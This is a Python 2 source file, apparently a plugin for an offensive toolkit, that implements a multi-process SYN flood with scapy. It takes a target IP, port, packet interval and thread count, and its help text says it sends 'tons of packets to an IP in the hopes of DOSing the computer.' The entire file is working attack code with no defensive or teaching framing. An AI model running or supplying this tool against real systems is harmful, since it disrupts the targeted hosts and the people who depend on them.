from capability import *
from scapy.all import *
import multiprocessing

class Syn(Capability):
    
    def __init__(self, core):
        super(Syn, self).__init__(core)
        self.name = "Syn Flood"
        self.options = {
                "port"   : Option("port", 80, "port to flood", True),
                "target" : Option("target", "", "IP of target to attack", True),
                "inter"  : Option("inter", 0.3, "Interval between sending packets", True),
                "threads": Option("threads", 3, "Number of threads", True),
                "verbose": Option("verbose", 1, "Verbosity - 3 will show all packets", True),
                }
        self.help_text = INFO + "Sends tons of packets to an IP in the hopes of DOSing the computer." 

    def exec_command(self, comm):
        self.core.cur.execute(comm)
        return self.core.cur.fetchall()[0][0]

    def flood(self):
        p = IP(dst=self.get_value("target"), id=1111, ttl=99)/TCP(sport=RandShort(), dport=int(self.get_value("port")), seq=12345, ack=1000, window=1000, flags="S")/"Payload"
        ans, unans = srloop(p, inter=float(self.get_value("inter")), retry=2, timeout=4, verbose=int(self.get_value("verbose")))
    
    def launch(self):
        self.threads = []
        print "Type 'restore' when ready to stop the attack.'"
        for i in range(1, int(self.get_value("threads"))+1):
            print "Beginning thread" + str(i)
            self.threads.append(multiprocessing.Process(target=self.flood, args=()))
            self.threads[i-1].start()

    def restore(self):
        for i in range(1, int(self.get_value("threads"))+1):
            self.threads[i-1].terminate()
            print "Terminating thread " + str(i)
